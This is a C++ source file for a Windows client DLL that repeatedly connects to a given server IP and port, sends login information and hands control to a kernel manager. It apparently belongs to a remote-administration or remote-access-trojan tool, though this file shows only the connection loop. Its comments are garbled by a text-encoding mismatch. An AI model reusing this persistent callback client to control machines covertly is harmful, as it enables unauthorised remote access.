// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
using namespace std;

char  g_szServerIP[MAX_PATH] = {0};  
unsigned short g_uPort = 0; 
bool g_bExit = false;
bool g_bThreadExit = false;
HINSTANCE  g_hInstance = NULL;        
DWORD WINAPI StartClient(LPVOID lParam);

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_hInstance = (HINSTANCE)hInstance; 

			break;
		}		
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
	g_uPort = uPort;

	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
#ifdef _DEBUG
	WaitForSingleObject(hThread, 200);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }


// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }


DWORD WINAPI StartClient(LPVOID lParam)
{
	IOCPClient  *ClientObject = new IOCPClient();

	while (!g_bExit)
	{
		DWORD dwTickCount = GetTickCount();  
		if (!ClientObject->ConnectServer(g_szServerIP, g_uPort))
		{
			for (int k = 500; !g_bExit && --k; Sleep(10));
			continue;
		}
		//׼����һ������
		SendLoginInfo(ClientObject, GetTickCount()-dwTickCount); 

		CKernelManager	Manager(ClientObject);   
		bool	bIsRun = 0;
		do 
		{
			Sleep(200);

			bIsRun  = ClientObject->IsRunning();

		} while (bIsRun && ClientObject->IsConnected() && !g_bExit);
	}

	cout<<"StartClient end\n";
	delete ClientObject;
	g_bThreadExit = true;

	return 0;
} 
